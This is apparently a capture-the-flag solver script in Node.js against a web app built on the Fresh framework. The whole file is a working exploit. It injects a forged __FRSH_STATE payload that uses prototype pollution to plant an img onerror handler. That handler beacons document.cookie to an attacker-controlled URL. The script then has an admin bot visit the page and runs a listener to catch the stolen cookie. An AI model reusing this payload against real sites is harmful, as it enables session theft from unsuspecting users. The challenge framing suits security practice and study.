const fastify = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? fail("No BOT_BASE_URL");
const WEB_BASE_URL = process.env.WEB_BASE_URL ?? fail("No BOT_BASE_URL");
const ATTACKER_BASE_URL =
  process.env.ATTACKER_BASE_URL ?? fail("No ATTACKER_BASE_URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const start = async () => {
  const text = `<h1 id="__FRSH_STATE">${JSON.stringify({
    v: {
      0: [
        {
          text: {
            _f: "s",
            v: `&lt;img src=0 onerror="navigator.sendBeacon('${ATTACKER_BASE_URL}', document.cookie)"&gt;`,
          },
        },
      ],
      "*": ["onerror"],
    },
    r: [[["*"], ["constructor", "prototype", "*"]]],
  })}</h1>`;

  const body = new FormData();
  body.set("text", text);

  const res = await fetch(`${WEB_BASE_URL}/save`, {
    method: "POST",
    body,
  });

  const targetUrl = `http://web:3000${new URL(res.url).pathname}`;
  console.log({ targetUrl });

  fastify.post("/", async (req, reply) => {
    // You got a flag!
    console.log(req.body);
    process.exit(0);
  });

  fastify.listen({ port: PORT, host: "0.0.0.0" }, async (err, address) => {
    if (err) fail(err.toString());

    await sleep(3 * 1000);
    await reportUrl(targetUrl);

    fail("Failed");
  });
};
start();
